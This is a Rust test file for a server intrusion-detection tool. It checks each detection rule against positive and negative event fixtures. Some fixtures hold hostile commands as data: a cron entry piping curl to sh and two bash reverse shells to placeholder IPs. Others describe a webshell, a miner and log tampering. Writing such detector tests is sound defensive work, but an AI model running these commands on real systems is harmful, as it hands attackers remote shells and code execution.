use super::{default_detectors, DetectContext};
use crate::notify::render_alert_for_config;
use sentinel_core::{Finding, NotificationLanguage, RawEvent, SentinelConfig};
use std::collections::BTreeSet;
use std::sync::Arc;

struct PositiveCase {
    rule_id: &'static str,
    name: &'static str,
    events: Vec<RawEvent>,
}

struct NegativeCase {
    rule_id: &'static str,
    name: &'static str,
    events: Vec<RawEvent>,
}

#[test]
fn every_builtin_risk_rule_has_positive_and_negative_coverage() {
    let config = SentinelConfig::default();
    let positives = positive_cases();
    let negatives = negative_cases();
    let detector_rule_ids = detector_rule_ids();
    let positive_rule_ids = positives
        .iter()
        .map(|case| case.rule_id)
        .collect::<BTreeSet<_>>();
    let negative_rule_ids = negatives
        .iter()
        .map(|case| case.rule_id)
        .collect::<BTreeSet<_>>();

    assert_eq!(positive_rule_ids, detector_rule_ids);
    assert_eq!(negative_rule_ids, detector_rule_ids);

    for case in positives {
        let findings = detect_all(case.events, config.clone());
        let finding = finding_for_rule(&findings, case.rule_id);
        assert!(
            finding.is_some(),
            "positive case '{}' did not produce {}; produced {:?}",
            case.name,
            case.rule_id,
            findings
                .iter()
                .map(|finding| finding.rule_id.as_str())
                .collect::<Vec<_>>()
        );
        if let Some(finding) = finding {
            assert_rendered_alert_is_human_readable(finding, case.name);
        }
    }

    for case in negatives {
        let findings = detect_all(case.events, config.clone());
        assert!(
            !findings
                .iter()
                .any(|finding| finding.rule_id == case.rule_id),
            "negative case '{}' unexpectedly produced {}: {:?}",
            case.name,
            case.rule_id,
            findings
                .iter()
                .map(|finding| finding.rule_id.as_str())
                .collect::<Vec<_>>()
        );
    }
}

#[test]
fn root_password_login_is_one_combined_alert() {
    let findings = detect_all(
        vec![ssh_success("root", "password")],
        SentinelConfig::default(),
    );

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].rule_id, "SSH-001");
    assert!(findings[0]
        .evidence
        .iter()
        .any(|item| item.key == "method" && item.value == "password"));
    assert!(!findings.iter().any(|finding| finding.rule_id == "SSH-002"));
}

fn detect_all(events: Vec<RawEvent>, config: SentinelConfig) -> Vec<Finding> {
    let ctx = DetectContext::new(Arc::new(config));
    let mut findings = Vec::new();
    for detector in default_detectors() {
        findings.extend(detector.detect(&events, &ctx));
    }
    findings
}

fn detector_rule_ids() -> BTreeSet<&'static str> {
    default_detectors()
        .into_iter()
        .flat_map(|detector| detector.rules())
        .map(|rule| rule.id)
        .collect()
}

fn finding_for_rule<'a>(findings: &'a [Finding], rule_id: &str) -> Option<&'a Finding> {
    findings.iter().find(|finding| finding.rule_id == rule_id)
}

fn assert_rendered_alert_is_human_readable(finding: &Finding, case_name: &str) {
    let mut config = SentinelConfig::default();
    config.agent.display_name = "matrix-vps".to_string();
    config.notifications.language = NotificationLanguage::ZhCn;
    config.notifications.include_technical_fields = false;
    let alert = render_alert_for_config(finding, &config);

    assert!(
        alert.subject.contains("[matrix-vps]"),
        "case '{case_name}' subject missing VPS name: {}",
        alert.subject
    );
    assert!(
        alert.telegram_html.contains("matrix-vps"),
        "case '{case_name}' telegram body missing VPS name"
    );
    assert!(
        !alert.telegram_html.contains("<html"),
        "case '{case_name}' telegram body should not be a full HTML document"
    );
    assert!(
        !alert.plain_text.contains(&finding.id) && !alert.plain_text.contains(&finding.dedup_key),
        "case '{case_name}' leaked technical fields while disabled"
    );
    assert!(
        !contains_mojibake_marker(&alert.subject)
            && !contains_mojibake_marker(&alert.plain_text)
            && !contains_mojibake_marker(&alert.telegram_html),
        "case '{case_name}' rendered likely mojibake: {}",
        alert.subject
    );

    config.notifications.include_technical_fields = true;
    let technical = render_alert_for_config(finding, &config);
    assert!(
        technical.plain_text.contains(&finding.rule_id)
            && technical.plain_text.contains(&finding.id)
            && technical.plain_text.contains(&finding.dedup_key),
        "case '{case_name}' technical fields were not rendered when enabled"
    );
}

fn contains_mojibake_marker(text: &str) -> bool {
    ["妫", "鐢", "杩", "绯", "鏂", "閰", "鍙", "淇", "乻", "丼"]
        .iter()
        .any(|marker| text.contains(marker))
}

fn positive_cases() -> Vec<PositiveCase> {
    vec![
        positive(
            "SSH-001",
            "root ssh login",
            vec![ssh_success("root", "publickey")],
        ),
        positive(
            "SSH-002",
            "password ssh login",
            vec![ssh_success("deploy", "password")],
        ),
        positive(
            "SSH-003",
            "ssh brute force",
            (0..10)
                .map(|index| ssh_failure("203.0.113.20", &format!("user{index}")))
                .collect(),
        ),
        positive(
            "SSH-004",
            "ordinary ssh login",
            vec![ssh_success("deploy", "publickey")],
        ),
        positive("SSH-007", "ssh brute force followed by success", {
            let mut events = (0..10)
                .map(|index| ssh_failure("203.0.113.21", &format!("user{index}")))
                .collect::<Vec<_>>();
            events.push(ssh_success_from("deploy", "password", "203.0.113.21"));
            events
        }),
        positive(
            "SSH-005",
            "authorized keys drift",
            vec![diff_file(
                "/root/.ssh/authorized_keys",
                "file_modified",
                "old",
                "new",
            )],
        ),
        positive(
            "SSH-006",
            "authorized keys unsafe permissions",
            vec![RawEvent::new("file_integrity", "file_snapshot")
                .with_field("path", "/root/.ssh/authorized_keys")
                .with_field("file_type", "file")
                .with_field("mode_octal", "0666")],
        ),
        positive(
            "FILE-001",
            "critical file drift",
            vec![diff_file("/etc/passwd", "file_modified", "old", "new")],
        ),
        positive(
            "FILE-002",
            "webshell markers",
            vec![RawEvent::new("file", "file_snapshot")
                .with_field("path", "/var/www/html/shell.php")
                .with_field("content_markers", "eval_call,base64_decode")
                .with_field("size", "128")],
        ),
        positive(
            "FILE-003",
            "executable web file",
            vec![RawEvent::new("file", "file_snapshot")
                .with_field("path", "/var/www/html/upload.bin")
                .with_field("is_web_path", "true")
                .with_field("executable", "true")
                .with_field("extension", "bin")],
        ),
        positive(
            "FILE-004",
            "short-lived sensitive file write",
            vec![RawEvent::new("ebpf", "file_activity")
                .with_field("path", "/etc/cron.d/worker")
                .with_field("operation", "write")
                .with_field("process_name", "bash")
                .with_field("event_source_detail", "file_write")
                .with_field("ephemeral_event", "true")],
        ),
        positive(
            "USER-001",
            "new user",
            vec![user_event("user_created", "app", "1001")],
        ),
        positive(
            "USER-002",
            "uid zero account",
            vec![user_event("user_created", "backuproot", "0")],
        ),
        positive(
            "USER-003",
            "user changed",
            vec![user_event("user_modified", "deploy", "1001").with_field("previous_uid", "1000")],
        ),
        positive(
            "PERSIST-001",
            "persistence file drift",
            vec![persistence_diff("persistence_created", "systemd")],
        ),
        positive(
            "PERSIST-002",
            "download to shell persistence",
            vec![RawEvent::new("persistence", "persistence_entry")
                .with_field("path", "/etc/cron.d/backup")
                .with_field("type", "cron")
                .with_field(
                    "suspicious_lines",
                    "* * * * * curl http://203.0.113.5/x | sh",
                )],
        ),
        positive(
            "PERSIST-003",
            "ld preload persistence drift",
            vec![persistence_diff("persistence_modified", "ld_preload")],
        ),
        positive(
            "PROC-001",
            "temporary process",
            vec![process_event("42", ".x", "/tmp/.x", "/tmp/.x")],
        ),
        positive(
            "PROC-002",
            "deleted temporary executable",
            vec![process_event(
                "43",
                ".x",
                "/dev/shm/.x (deleted)",
                "/dev/shm/.x",
            )],
        ),
        positive(
            "PROC-003",
            "network shell bridge",
            vec![process_event(
                "44",
                "bash",
                "/bin/bash",
                "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1",
            )],
        ),
        positive(
            "PROC-004",
            "known miner identity",
            vec![process_event(
                "45",
                "xmrig",
                "/usr/local/bin/xmrig",
                "/usr/local/bin/xmrig -o pool",
            )],
        ),
        positive(
            "PROC-005",
            "renamed web path process behavior cluster",
            vec![process_event(
                "46",
                "kworker",
                "/var/www/html/.cache/kworker",
                "/var/www/html/.cache/kworker --serve",
            )
            .with_field("cwd", "/var/www/html")
            .with_field("socket_fd_count", "3")],
        ),
        positive(
            "PROC-006",
            "renamed gpu process with mining-pool port",
            vec![
                process_event("47", ".sysd", "/root/.cache/.sysd", "/root/.cache/.sysd"),
                gpu_event("47", "/root/.cache/.sysd", "4096"),
                RawEvent::new("network", "outbound_connection")
                    .with_field("pid", "47")
                    .with_field("remote_addr", "198.51.100.10")
                    .with_field("remote_port", "3333")
                    .with_field("remote_public", "true"),
            ],
        ),
        positive(
            "NET-001",
            "new public port",
            vec![listener(
                "baseline",
                "listening_socket",
                "0.0.0.0",
                "8080",
                "app",
                "/usr/bin/app",
            )],
        ),
        positive(
            "NET-002",
            "listener owner changed",
            vec![listener(
                "baseline",
                "listening_socket_owner_changed",
                "0.0.0.0",
                "443",
                "nginx2",
                "/usr/sbin/nginx2",
            )
            .with_field("previous_process_name", "nginx")
            .with_field("previous_executable", "/usr/sbin/nginx")],
        ),
        positive(
            "NET-003",
            "suspicious listener process",
            vec![listener(
                "network",
                "listening_socket",
                "0.0.0.0",
                "443",
                ".x",
                "/tmp/.x",
            )],
        ),
        positive(
            "CONFIG-003",
            "public high-risk port",
            vec![listener(
                "network",
                "listening_socket",
                "0.0.0.0",
                "6379",
                "redis",
                "/usr/bin/redis-server",
            )],
        ),
        positive(
            "WEB-001",
            "web probe",
            vec![web_access("203.0.113.30", "/.env", "404")],
        ),
        positive(
            "WEB-002",
            "web error burst",
            (0..20)
                .map(|index| web_access("203.0.113.31", &format!("/missing-{index}"), "404"))
                .collect(),
        ),
        positive(
            "CONFIG-001",
            "password auth enabled",
            vec![ssh_config("PasswordAuthentication", "yes")],
        ),
        positive(
            "CONFIG-004",
            "root ssh enabled",
            vec![ssh_config("PermitRootLogin", "yes")],
        ),
        positive(
            "DOCKER-001",
            "docker socket",
            vec![RawEvent::new("docker", "docker_socket")
                .with_field("path", "/var/run/docker.sock")
                .with_field("exists", "true")],
        ),
        positive(
            "ROOTKIT-003",
            "ld preload active entry",
            vec![RawEvent::new("rootkit", "ld_preload_present")
                .with_field("path", "/etc/ld.so.preload")
                .with_field("entries", "/tmp/libhide.so")],
        ),
        positive(
            "TAMPER-001",
            "auth log redirected to null",
            vec![log_event("/var/log/auth.log", "symlink", "0")
                .with_field("symlink_target", "/dev/null")],
        ),
        positive(
            "TAMPER-002",
            "auth log abruptly truncated",
            vec![log_event("/var/log/auth.log", "file", "512")
                .with_field("log_size_drop", "true")
                .with_field("previous_size", "1048576")
                .with_field("current_size", "512")
                .with_field("dropped_bytes", "1048064")
                .with_field("drop_percent", "99")],
        ),
        positive(
            "TAMPER-003",
            "auth log disappeared",
            vec![log_event("/var/log/auth.log", "missing", "0")
                .with_field("log_file_missing", "true")
                .with_field("previous_file_type", "file")
                .with_field("previous_size", "4096")],
        ),
        positive(
            "AUDIT-001",
            "audit network execution bridge",
            vec![RawEvent::new("auditd", "audit_exec")
                .with_field("argv", "bash -c bash -i >& /dev/tcp/198.51.100.1/4444 0>&1")
                .with_field("exe", "/usr/bin/bash")
                .with_field("comm", "bash")],
        ),
        positive(
            "AUDIT-002",
            "audit privilege shell command",
            vec![RawEvent::new("auditd", "audit_exec")
                .with_field("argv", "sudo sh -c id")
                .with_field("exe", "/usr/bin/sudo")
                .with_field("comm", "sudo")],
        ),
    ]
}

fn negative_cases() -> Vec<NegativeCase> {
    vec![
        negative(
            "SSH-001",
            "non-root ssh login",
            vec![ssh_success("deploy", "publickey")],
        ),
        negative(
            "SSH-002",
            "key ssh login",
            vec![ssh_success("deploy", "publickey")],
        ),
        negative(
            "SSH-003",
            "below brute force threshold",
            (0..5)
                .map(|index| ssh_failure("203.0.113.20", &format!("user{index}")))
                .collect(),
        ),
        negative(
            "SSH-004",
            "root login is not ordinary login",
            vec![ssh_success("root", "publickey")],
        ),
        negative("SSH-007", "ssh success without brute force threshold", {
            let mut events = (0..3)
                .map(|index| ssh_failure("203.0.113.21", &format!("user{index}")))
                .collect::<Vec<_>>();
            events.push(ssh_success_from("deploy", "password", "203.0.113.21"));
            events
        }),
        negative(
            "SSH-005",
            "unrelated authorized keys filename",
            vec![diff_file(
                "/tmp/authorized_keys",
                "file_modified",
                "old",
                "new",
            )],
        ),
        negative(
            "SSH-006",
            "strict authorized keys file",
            vec![RawEvent::new("file_integrity", "file_snapshot")
                .with_field("path", "/root/.ssh/authorized_keys")
                .with_field("file_type", "file")
                .with_field("mode_octal", "0600")],
        ),
        negative(
            "FILE-001",
            "non-critical file drift",
            vec![diff_file("/opt/app/config", "file_modified", "old", "new")],
        ),
        negative(
            "FILE-002",
            "clean web file",
            vec![RawEvent::new("file", "file_snapshot")
                .with_field("path", "/var/www/html/index.html")
                .with_field("is_web_path", "true")
                .with_field("executable", "false")
                .with_field("extension", "html")],
        ),
        negative(
            "FILE-003",
            "executable outside web path",
            vec![RawEvent::new("file", "file_snapshot")
                .with_field("path", "/opt/app/tool")
                .with_field("is_web_path", "false")
                .with_field("executable", "true")
                .with_field("extension", "")],
        ),
        negative(
            "FILE-004",
            "short-lived non-sensitive file write",
            vec![RawEvent::new("ebpf", "file_activity")
                .with_field("path", "/opt/app/config.yml")
                .with_field("operation", "write")],
        ),
        negative(
            "USER-001",
            "uid zero user is privilege finding",
            vec![user_event("user_created", "backuproot", "0")],
        ),
        negative(
            "USER-002",
            "normal uid user",
            vec![user_event("user_created", "app", "1001")],
        ),
        negative(
            "USER-003",
            "user snapshot is not drift",
            vec![RawEvent::new("users", "user_account").with_field("name", "deploy")],
        ),
        negative(
            "PERSIST-001",
            "current persistence snapshot",
            vec![RawEvent::new("persistence", "persistence_entry")
                .with_field("path", "/etc/systemd/system/app.service")
                .with_field("type", "systemd")],
        ),
        negative(
            "PERSIST-002",
            "plain cloud-init shell wrapper",
            vec![RawEvent::new("persistence", "persistence_entry")
                .with_field(
                    "path",
                    "/usr/lib/systemd/system/cloud-init-hotplugd.service",
                )
                .with_field("type", "systemd")
                .with_field(
                    "suspicious_lines",
                    "ExecStart=/bin/bash -c 'read args <&3; echo args=$args'",
                )],
        ),
        negative(
            "PERSIST-003",
            "ordinary systemd persistence drift",
            vec![persistence_diff("persistence_modified", "systemd")],
        ),
        negative(
            "PROC-001",
            "standard process path",
            vec![process_event(
                "42",
                "sshd",
                "/usr/sbin/sshd",
                "/usr/sbin/sshd -D",
            )],
        ),
        negative(
            "PROC-002",
            "package upgrade deleted executable residue",
            vec![process_event(
                "43",
                "systemd-logind",
                "/usr/lib/systemd/systemd-logind (deleted)",
                "/lib/systemd/systemd-logind",
            )],
        ),
        negative(
            "PROC-003",
            "plain traffic forwarder",
            vec![process_event(
                "44",
                "socat",
                "/usr/bin/socat",
                "socat TCP4-LISTEN:8848,reuseaddr,fork TCP4:example.com:443",
            )],
        ),
        negative(
            "PROC-004",
            "tool name only in argument",
            vec![process_event(
                "45",
                "worker",
                "/usr/local/bin/worker",
                "/usr/local/bin/worker --profile xmrig",
            )
            .with_field(
                "argv_json",
                r#"["/usr/local/bin/worker","--profile","xmrig"]"#,
            )],
        ),
        negative(
            "PROC-005",
            "ordinary service with many sockets",
            vec![
                process_event("46", "nginx", "/usr/sbin/nginx", "nginx: worker process")
                    .with_field("cwd", "/")
                    .with_field("socket_fd_count", "64"),
            ],
        ),
        negative(
            "PROC-006",
            "ordinary GPU training workload",
            vec![
                process_event(
                    "47",
                    "python",
                    "/home/ml/.venv/bin/python",
                    "python train.py --dataset s3://bucket",
                ),
                gpu_event("47", "/home/ml/.venv/bin/python", "24576"),
                RawEvent::new("network", "outbound_connection")
                    .with_field("pid", "47")
                    .with_field("remote_addr", "203.0.113.20")
                    .with_field("remote_port", "443")
                    .with_field("remote_public", "true"),
            ],
        ),
        negative(
            "NET-001",
            "current unbaselined port is context only",
            vec![listener(
                "network",
                "listening_socket",
                "0.0.0.0",
                "8080",
                "app",
                "/usr/bin/app",
            )],
        ),
        negative(
            "NET-002",
            "private listener owner changed",
            vec![listener(
                "baseline",
                "listening_socket_owner_changed",
                "127.0.0.1",
                "443",
                "nginx2",
                "/usr/sbin/nginx2",
            )],
        ),
        negative(
            "NET-003",
            "ordinary web listener",
            vec![listener(
                "network",
                "listening_socket",
                "0.0.0.0",
                "443",
                "nginx",
                "/usr/sbin/nginx",
            )],
        ),
        negative(
            "CONFIG-003",
            "ordinary web port",
            vec![listener(
                "network",
                "listening_socket",
                "0.0.0.0",
                "443",
                "nginx",
                "/usr/sbin/nginx",
            )],
        ),
        negative(
            "WEB-001",
            "ordinary asset request",
            vec![web_access("203.0.113.30", "/assets/app.css", "200")],
        ),
        negative(
            "WEB-002",
            "below web error burst threshold",
            (0..19)
                .map(|index| web_access("203.0.113.31", &format!("/missing-{index}"), "404"))
                .collect(),
        ),
        negative(
            "CONFIG-001",
            "password auth disabled",
            vec![ssh_config("PasswordAuthentication", "no")],
        ),
        negative(
            "CONFIG-004",
            "root ssh disabled",
            vec![ssh_config("PermitRootLogin", "no")],
        ),
        negative("DOCKER-001", "no docker event", Vec::new()),
        negative(
            "ROOTKIT-003",
            "empty ld preload",
            vec![RawEvent::new("rootkit", "ld_preload_present")
                .with_field("path", "/etc/ld.so.preload")
                .with_field("entries", "")],
        ),
        negative(
            "TAMPER-001",
            "ordinary auth log file",
            vec![log_event("/var/log/auth.log", "file", "8192")],
        ),
        negative(
            "TAMPER-002",
            "auth log truncation with recent rotation",
            vec![log_event("/var/log/auth.log", "file", "0")
                .with_field("log_size_drop", "true")
                .with_field("recent_rotated_sibling", "true")
                .with_field("rotated_sibling", "/var/log/auth.log.1")],
        ),
        negative(
            "TAMPER-003",
            "new host without previous log state",
            vec![log_event("/var/log/auth.log", "missing", "0")],
        ),
        negative(
            "AUDIT-001",
            "audit ordinary command",
            vec![RawEvent::new("auditd", "audit_exec")
                .with_field("argv", "systemctl status nginx")
                .with_field("exe", "/usr/bin/systemctl")
                .with_field("comm", "systemctl")],
        ),
        negative(
            "AUDIT-002",
            "audit ordinary sudo status",
            vec![RawEvent::new("auditd", "audit_exec")
                .with_field("argv", "sudo systemctl status nginx")
                .with_field("exe", "/usr/bin/sudo")
                .with_field("comm", "sudo")],
        ),
    ]
}

fn positive(rule_id: &'static str, name: &'static str, events: Vec<RawEvent>) -> PositiveCase {
    PositiveCase {
        rule_id,
        name,
        events,
    }
}

fn negative(rule_id: &'static str, name: &'static str, events: Vec<RawEvent>) -> NegativeCase {
    NegativeCase {
        rule_id,
        name,
        events,
    }
}

fn ssh_success(user: &str, method: &str) -> RawEvent {
    ssh_success_from(user, method, "203.0.113.10")
}

fn ssh_success_from(user: &str, method: &str, ip: &str) -> RawEvent {
    RawEvent::new("ssh", "ssh_auth")
        .with_field("outcome", "success")
        .with_field("method", method)
        .with_field("user", user)
        .with_field("source_ip", ip)
        .with_field("port", "54122")
        .with_field("log_source", "/var/log/auth.log")
}

fn ssh_failure(ip: &str, user: &str) -> RawEvent {
    RawEvent::new("ssh", "ssh_auth")
        .with_field("outcome", "failure")
        .with_field("method", "password")
        .with_field("user", user)
        .with_field("source_ip", ip)
        .with_field("log_source", "/var/log/auth.log")
}

fn diff_file(path: &str, kind: &str, previous_hash: &str, current_hash: &str) -> RawEvent {
    RawEvent::new("baseline", kind)
        .with_field("path", path)
        .with_field("previous_hash", previous_hash)
        .with_field("current_hash", current_hash)
}

fn user_event(kind: &str, name: &str, uid: &str) -> RawEvent {
    RawEvent::new("baseline", kind)
        .with_field("name", name)
        .with_field("uid", uid)
        .with_field("gid", "1001")
        .with_field("home", format!("/home/{name}"))
        .with_field("shell", "/bin/bash")
}

fn persistence_diff(kind: &str, persistence_type: &str) -> RawEvent {
    RawEvent::new("baseline", kind)
        .with_field("path", "/etc/systemd/system/app.service")
        .with_field("type", persistence_type)
        .with_field("previous_hash", "old")
        .with_field("current_hash", "new")
}

fn process_event(pid: &str, name: &str, exe_path: &str, cmdline: &str) -> RawEvent {
    RawEvent::new("process", "process_snapshot")
        .with_field("pid", pid)
        .with_field("ppid", "1")
        .with_field("name", name)
        .with_field("exe_path", exe_path)
        .with_field("cmdline", cmdline)
}

fn gpu_event(pid: &str, process_name: &str, memory_mb: &str) -> RawEvent {
    RawEvent::new("gpu", "gpu_compute_process")
        .with_field("pid", pid)
        .with_field("gpu_process_name", process_name)
        .with_field("gpu_memory_mb", memory_mb)
        .with_field("gpu_uuid", "GPU-test")
}

fn listener(
    source: &str,
    kind: &str,
    local_addr: &str,
    local_port: &str,
    process_name: &str,
    executable: &str,
) -> RawEvent {
    RawEvent::new(source, kind)
        .with_field("protocol", "tcp")
        .with_field("local_addr", local_addr)
        .with_field("local_port", local_port)
        .with_field("process_name", process_name)
        .with_field("executable", executable)
        .with_field("cmdline", executable)
}

fn web_access(ip: &str, path: &str, status: &str) -> RawEvent {
    RawEvent::new("web", "web_access")
        .with_field("ip", ip)
        .with_field("method", "GET")
        .with_field("path", path)
        .with_field("status", status)
        .with_field("log_source", "/var/log/nginx/access.log")
}

fn ssh_config(key: &str, value: &str) -> RawEvent {
    RawEvent::new("config", "ssh_config_option")
        .with_field("path", "/etc/ssh/sshd_config")
        .with_field("key", key)
        .with_field("value", value)
}

fn log_event(path: &str, file_type: &str, size: &str) -> RawEvent {
    RawEvent::new("log_integrity", "log_file_snapshot")
        .with_field("path", path)
        .with_field("file_type", file_type)
        .with_field("size", size)
}
